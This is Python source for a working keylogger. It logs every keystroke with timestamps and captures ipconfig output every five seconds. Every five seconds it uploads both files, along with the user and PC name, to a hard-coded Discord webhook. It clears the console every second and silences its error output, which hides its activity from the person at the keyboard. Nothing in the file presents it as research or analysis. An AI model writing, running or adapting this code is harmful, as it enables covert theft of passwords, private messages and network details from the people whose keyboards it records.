import os
import platform
import random
import string
import subprocess
import threading
import time
import pygame
import json
import requests
import socket
import pyperclip
import psutil
from pathlib import Path
from pynput import keyboard
import tkinter as tk

# Initialize variables and paths
pc_name = socket.gethostname()
log_file = "key_log.txt"
file_pathip = os.path.join(os.getcwd(), 'ipconfig.txt')
user_name = os.environ.get('USER') or os.environ.get('USERNAME')
last_timestamp = None

# Ensure the log files exist
if not os.path.exists(log_file):
    Path(log_file).touch()

if not os.path.exists(file_pathip):
    Path(file_pathip).touch()

def get_timestamp():
    """Returns the current timestamp as a formatted string."""
    return time.strftime("[%Y-%m-%d %H:%M] ")

def on_press(key):
    """Logs the pressed key to the file with timestamp every minute."""
    global last_timestamp

    try:
        with open(log_file, "a") as f:
            current_time = time.time()
            formatted_time = get_timestamp()

            # Add a new timestamp every minute
            if last_timestamp is None or (current_time - last_timestamp) >= 60:
                f.write(f"\n{formatted_time}\n")
                last_timestamp = current_time

            # Log the keypress
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Log regular keys
            else:
                f.write(f" [{key}] ")  # Log special keys (Enter, Shift, etc.)

    except Exception as e:
        print(f"Error: {e}")

def upload_file_to_webhook(file_path, webhook_url):
    """Uploads files to a Discord webhook."""
    try:
        # Open the files in binary mode
        with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile:
            payload = {
                'content': f'Here are the logs for the user {user_name} and the PC name is {pc_name}. This message also includes IPCONFIG data.'
            }
            files = {
                'file1': (file_path, file),
                'file2': (file_pathip, ipfile)
            }
            response = requests.post(webhook_url, data=payload, files=files)
            if response.status_code == 204:
                # print(f"Successfully uploaded {file_path} and {file_pathip}")
                print("")
            else:
                # print(f"Failed to upload {file_path} and {file_pathip}: {response.status_code}")
                print("")
    except Exception as e:
        # print(f"Error uploading file: {e}")
        print("")

def upload_every_5_seconds(file_path, webhook_url):
    """Uploads the log file to the Discord webhook every 5 seconds."""
    while True:
        # print("Uploading the log file every 5 seconds...")
        print("")
        upload_file_to_webhook(file_path, webhook_url)
        time.sleep(5)

def run_ipconfig():
    """Captures and writes the output of 'ipconfig' to the ipconfig.txt file every 5 seconds."""
    while True:
        try:
            # Run the ipconfig command and capture the output
            result = subprocess.run(['ipconfig'], capture_output=True, text=True)

            # Open the ipconfig.txt file and write the output (overwrite every time)
            with open(file_pathip, 'w') as file:
                file.write(result.stdout)
                # print("ipconfig output written to ipconfig.txt")
                print("")
        
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(5)  # Capture every 5 seconds

def clear_console():
    """Clears the console screen every 1 second."""
    while True:
        # For Windows
        if os.name == 'nt':
            os.system('cls')
        # For macOS or Linux
        else:
            os.system('clear')
        
        time.sleep(1)

# Define webhook URL
webhook_url = 'https://discord.com/api/webhooks/1335214600714457158/tzhsBy9cn-22l9vBGxfDs8kaoQ4CCsuTkqQhNvJe5BQ6ECrgHBD4JvEt-e5Kj3hftuSO'

# Start the upload thread for the log file
upload_thread = threading.Thread(target=upload_every_5_seconds, args=(log_file, webhook_url))
upload_thread.daemon = True
upload_thread.start()

# Start the ipconfig logging thread
ipconfig_thread = threading.Thread(target=run_ipconfig)
ipconfig_thread.daemon = True
ipconfig_thread.start()

# Start the console clearing thread
clear_thread = threading.Thread(target=clear_console, daemon=True)
clear_thread.start()

# Start the key listener in the main thread
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
